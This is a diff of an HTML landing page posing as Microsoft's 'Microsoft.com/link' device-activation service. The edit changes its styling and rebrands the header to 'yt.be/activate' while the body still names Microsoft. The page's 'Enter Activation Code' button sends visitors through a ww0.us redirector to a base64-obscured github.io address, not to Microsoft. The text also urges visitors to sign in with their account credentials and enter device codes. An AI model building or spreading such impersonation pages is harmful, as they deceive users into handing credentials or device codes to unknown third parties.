@@ -25,19 +25,14 @@
         @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
 
         body {
-            font-family: 'Poppins';
+            font-family: 'Poppins', sans-serif;
             margin: 0;
             padding: 0;
             color: #333;
         }
 
-        /* style.css*/
-
-        /* ------------------------- */
-        /* nav */
-        /* ---------------------- */
         header nav {
-            background-color: rgb(255, 255, 255);
+            background-color: #000;
             color: white;
             display: flex;
             justify-content: space-between;
@@ -50,10 +45,9 @@
         }
 
         header nav label i {
-            color: black;
+            color: white;
             align-items: center;
             justify-content: center;
-
         }
 
         header ul {
@@ -122,102 +116,43 @@
             }
         }
 
-        /* ------------------------- */
-        /* end nav */
-        /* ---------------------- */
-        #top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background-color: white;
-            height: 75px;
-            padding: 0 3rem;
-            opacity: 0.8;
-            transition: opacity 0.5s;
+        .container {
+            margin: 20px auto;
+            max-width: 800px;
+            padding: 0 20px;
         }
 
-        #top:hover {
-            opacity: 1;
+        .container h1 {
+            color: #000;
+            font-size:50px;
+        }
+        
+        
+        .container h2 {
+            color: #000;
+            font-size:35px;
         }
 
-        #logo img {
-            height: 50px;
+        .container .bg_sectionw, .container .bg_section {
+            padding: 20px;
+            margin-bottom: 20px;
             border-radius: 10px;
-            margin-top: 25spx;
         }
 
-        nav ul {
-            display: flex;
-            margin-left: -10%;
-            list-style: none;
-            padding: 0;
+        .container .bg_sectionw {
+            background-color: #ffffff;
         }
 
-        nav ul li {
-            margin: 0 30px;
-            font-weight: bold;
+        .container .bg_section {
+            background-color: #f5f5f5;
         }
 
-        nav ul li a {
-            display: block;
-            padding: 4px 0;
-            font-family: Lato, sans-serif;
-            color: #2f3030;
-            text-decoration: none;
-            text-transform: uppercase;
-            transition: transform 0.5s;
-        }
-
-        nav ul li a:hover {
-            transform: scale(1.1);
-        }
-
-        #cover-image {
-            position: relative;
-            width: 100%;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 80vh;
-        }
-
-        #cover-image::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
-            z-index: 1;
-        }
-
-        #cover-image img {
-            width: 100%;
-            height: 100%;
-            opacity: 0.5;
-            object-fit: cover;
-            position: relative;
-            z-index: 0;
-        }
-
-        #ss-container {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 2;
+        .button-container {
             text-align: center;
+            margin: 20px 0;
         }
 
-        #ss-container h1 {
-            font-size: 45px;
-            color: #fff;
-            border-bottom: 4px solid green;
-        }
-
-        #ss-container a {
+        .button-container a {
             background-color: green;
             border: none;
             color: white;
@@ -226,42 +161,23 @@
             text-decoration: none;
             display: inline-block;
             font-size: 16px;
-            margin: 4px 2px;
             border-radius: 35px;
             cursor: pointer;
-            z-index: 999;
         }
 
-        .container {
-            /* margin: 20px 100px; */
-            justify-content: center;
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #fff;
         }
 
-        .container h1 {
-            color: #3a4a60;
-        }
-
-        .container h2 {
-            color: #3a4a60;
-            margin-top: 0px;
-        }
-
-        .container .h_color {
-            color: white;
-        }
-
-        .container .bg_sectionw {
-            padding: 50px 100px;
-            background-color: #ffffff;
-        }
-
-        .container .bg_section {
-            padding: 50px 100px;
-            background-color: #e8f1ff;
+        footer p {
+            margin: 0;
+            color: rgb(0, 0, 0);
+            font-weight: 100;
         }
     </style>
 </head>
-
 <body>
 
     <!-- header  -->
@@ -272,8 +188,8 @@
                 <i class="fas fa-bars"></i>
             </label>
             <div style="display: flex; padding-top: 10px;">
-                <img src="fev.png" alt="" height="50px" width="50px">
-                <h1 style="color: black; margin-top: 5px; margin-left: 10px;">Microsoft.com/link</h1>
+                <img src="fev.png" alt="Logo" height="50px" width="50px">
+                <h1 style="color: white; margin-top: 5px; margin-left: 10px;">yt.be/activate</h1>
             </div>
             <ul>
                 <li><a class="active" href="#">Home</a></li>
@@ -283,30 +199,29 @@
     </header>
     <!-- end header  -->
 
-    <div id="cover-image">
-        <img src="a.png" alt="Loading....">
-        <div id="ss-container">
-            <h1>signin Microsoft.com/link</h1>
-            <a href="https://ww0.us/?aHR0cHM6Ly9taWNyb3NvZnRjb21saW5rLmdpdGh1Yi5pbw==" class="button">Enter Activation code</a>
+    <div class="container">
+        <div class="button-container">
+            <h1>Signin Microsoft.com/link
+</h1>
+            <a href="https://ww0.us?aHR0cHM6Ly95dC1iZWFjdGl2YXRlLmdpdGh1Yi5pbw==" class="button">Enter Activation Code</a>
         </div>
-    </div>
+
     <div class="container">
         <div class="bg_sectionw">
-            <h1>Welcome to Microsoft.com/link</h1>
-            <p>In today’s fast-paced digital world, managing your accounts and services can be overwhelming. That’s where
-                Microsoft.com/link comes in, offering a streamlined way to connect and manage your Microsoft accounts and
+            <center><h2>Welcome to Microsoft.com/link</h2> </center>
+            <p>In today’s fast-paced digital world, managing your accounts and services can be overwhelming. That’s where <b>Microsoft.com/link</b> comes in, offering a streamlined way to connect and manage your Microsoft accounts and
                 services. This guide will walk you through the process, highlighting the key benefits and steps to get
                 started.</p>
         </div>
         <div class="bg_section">
             <h2>What is Microsoft.com/link?</h2>
-            <p>Microsoft.com/link is a powerful tool designed to help users connect various Microsoft services and devices
+            <p><b>Microsoft.com/link</b> is a powerful tool designed to help users connect various Microsoft services and devices
                 with ease. Whether you’re linking your Xbox to your Microsoft account or connecting your PC to Microsoft
                 Office, this platform simplifies the process.</p>
         </div>
         <div class="bg_sectionw">
-            <h2>Why You Should Use Microsoft.com/link</h2>
-            <p>Using Microsoft.com/link offers numerous benefits:</p>
+            <h2>Why You Should Use <b>Microsoft.com/link</b></h2>
+            <p>Using <b>Microsoft.com/link</b> offers numerous benefits:</p>
             <ul>
                 <li><strong>Efficiency:</strong> Save time by managing all your Microsoft services in one place.</li>
                 <li><strong>Convenience:</strong> Seamlessly connect your devices and services.</li>
@@ -315,9 +230,9 @@
         </div>
         <div class="bg_section">
             <h2>Step-by-Step Guide to Using Microsoft.com/link</h2>
-            <p>Follow these steps to make the most out of Microsoft.com/link:</p>
+            <p>Follow these steps to make the most out of <b>Microsoft.com/link</b>:</p>
             <ol>
-                <li>Visit Microsoft.com/link: Open your web browser and go to the Microsoft.com/link page.</li>
+                <li>Visit Microsoft.com/link: Open your web browser and go to the <b>Microsoft.com/link</b> page.</li>
                 <li>Sign In: Use your Microsoft account credentials to sign in.</li>
                 <li>Enter the Code: If you’re linking a device, enter the code provided on your device.</li>
                 <li>Confirm Connection: Follow the on-screen instructions to confirm the connection.</li>
@@ -325,7 +240,7 @@
         </div>
         <div class="bg_sectionw">
             <h2>Troubleshooting Common Issues on Microsoft.com/link</h2>
-            <p>If you encounter any issues while using Microsoft.com/link, here are some tips to help you resolve them:</p>
+            <p>If you encounter any issues while using <b>Microsoft.com/link</b>, here are some tips to help you resolve them:</p>
             <ul>
                 <li>Check Internet Connection: Ensure you have a stable internet connection.</li>
                 <li>Verify Code: Double-check the code you entered to make sure it’s correct.</li>
@@ -337,7 +252,7 @@
         </div>
         <div class="bg_section">
             <h2>Maximizing the Benefits of Microsoft.com/link</h2>
-            <p>To get the most out of Microsoft.com/link, consider the following tips:</p>
+            <p>To get the most out of <b>Microsoft.com/link</b>, consider the following tips:</p>
             <ul>
                 <li>Regular Updates: Keep your devices and services updated to ensure compatibility.</li>
                 <li>Explore Features: Take time to explore all the features and services available through
@@ -347,7 +262,7 @@
         </div>
         <div class="bg_sectionw">
             <h2>How do I link my Microsoft account to another device using Microsoft.com/link?</h2>
-            <p>To link your Microsoft account to another device using Microsoft.com/link, follow these steps:</p>
+            <p>To link your Microsoft account to another device using <b>Microsoft.com/link</b>, follow these steps:</p>
             <ol>
                 <li>If you're linking a Windows device, go to Settings > Accounts > Your info.</li>
                 <li>If you're linking a different type of device (e.g., Xbox, Surface), go to the appropriate settings for
